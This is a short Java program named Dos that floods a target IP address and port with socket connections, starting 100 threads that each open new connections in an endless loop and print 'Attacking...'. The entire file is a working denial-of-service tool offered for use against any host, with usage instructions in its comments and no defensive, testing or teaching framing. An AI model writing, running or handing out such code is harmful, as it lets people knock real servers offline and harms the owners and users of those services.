//usage : Dos <IPAddress> <Port>
//sockets works as payload and network traffic is increased.
//will only work on small servers.
import java.io.*;
import java.net.*;
class Dos{
	public static void main(String arg[]){
        if(arg.length<2){
            System.out.println("usage : Dos <IPAddress> <Port>");
            return;
        }
		try{
			if(new Socket(arg[0],Integer.parseInt(arg[1]))!=null){//creates a new socket connection.
				System.out.println("Attacking...");
				for(int i=0;i<100;i++){
					new Thread(){//creates a new thread on every loop
						public void run(){
							for(;;){
								try{
									new Socket(arg[0],Integer.parseInt(arg[1])); //creates a new socket on every loop
								}catch(Exception e){System.out.println(e);}
							}
						}
					}.start();
				}
			}
			else
				System.out.println("Attack Failed!");
		}catch(Exception e){System.out.println(e);}
	}
}
